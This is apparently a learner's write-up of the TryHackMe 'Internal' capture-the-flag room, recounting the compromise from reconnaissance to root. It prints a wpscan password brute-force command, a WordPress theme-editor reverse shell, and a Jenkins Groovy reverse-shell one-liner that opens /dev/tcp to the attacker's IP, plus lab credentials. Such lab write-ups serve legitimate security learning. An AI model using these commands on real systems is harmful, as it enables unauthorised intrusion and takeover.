# Internal

https://tryhackme.com/room/internal

## Tasks

I started this challenge by doing a ```nmap``` to find which ports could have vulnerabilities.

<img style="max-width:100%; height:auto;" alt="image" src="https://github.com/user-attachments/assets/f5abcfa1-3230-4475-9687-ca484d099c14" />

Showing nothing too interesting, just ssh and http. So I continued on my normal route and started a gobuster and visited the http site at the same time

Right away viewing the first gobuster results I can see that this is a wordpress site and especially ```/phpmyadmin/``` peaks my interest since that shows me a way to login, I just need to figure out how to login. I also found another login in ```blog/wp-login.php```.

<img style="max-width:100%; height:auto;" alt="image" src="https://github.com/user-attachments/assets/0f4c6711-b933-424d-9dd5-7b577a3b62fe" />

<img style="max-width:100%; height:auto;" alt="image" src="https://github.com/user-attachments/assets/3142209d-ee00-49a3-9270-70a95971a323" />

So I knew admin was one login, I just put hydra to try to crack it with rockyou.txt but incase it didn't work I began to try other things in the meantime.

I was a bit stuck for a moment since I just tried to google if wordpress had vulnerabilities and what would be suitable for my situation. I found a tool called ```wpscan``` which was designed to find wordpress vulnerabilities so I ran it.

After running the tool and looking at other ways I can use it I found that I can also use it to bruteforce password for the admin login so I tried that ```wpscan — url http://internal.thm/wordpress -U admin -P /usr/share/wordlists/rockyou.txt```

<img style="max-width:100%; height:auto;" alt="image" src="https://github.com/user-attachments/assets/50b26e69-0a33-4742-882e-2817fc75cc51" />

So now I have admin login and password, so let's head to the site. I used the same method I had learned previously and went to theme editor to change a site to include a php reverse shell

After changing the 404 file I could find it in ```http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php```

After getting access from reverse shell I used ```python -c 'import pty; pty.spawn("/bin/bash")'``` to give more commands now that I was in I decided to look around directories

<img style="max-width:100%; height:auto;" alt="image" src="https://github.com/user-attachments/assets/e202212b-6f4d-4032-9677-e17f58429b67" />

Mindlessly looking around worked and I got aubreanna's login credentials ```aubreanna:bubb13guM!@#123``` and after logging in I found user.txt in aubreannas folder, now to get root access.

After trying to figure out a way to get access I found this

<img style="max-width:100%; height:auto;" alt="image" src="https://github.com/user-attachments/assets/3d24e9fe-17db-4f7b-bb56-50905146c17f" />

which peaked my interest and I though of ssh to that ip as aubreanna, I googled and found about ssh tunneling and got this page loaded

<img style="max-width:100%; height:auto;" alt="image" src="https://github.com/user-attachments/assets/66e83998-a24f-4ad4-b7d7-6af8a537a1f5" />

Now I decided to run hydra and brute force the admin password, now this took a long time but after a while I finally got the password ```admin : spongebob```

After logging in I looked around and found a ```scripting console``` 

<img style="max-width:100%; height:auto;" alt="image" src="https://github.com/user-attachments/assets/ce9961aa-eac6-4dd4-8d30-cd06bf89d4d3" />

Looking online I found a command I could execute to get access

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/my_ip:1234;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

And success, I got logged in as jenkins, I decided to visit ```/opt/``` again and found note.txt, where there was root password, wow that was easy...

I did ```su root``` and got access to /root and found the root flag

# Conclusion

This was my hardest challenge yet and it definitely took the most time. I had to use my previous knowledge and learn more, I also had to google quite many things to get forward at certain bits. But atleast I was able to hack the machine.
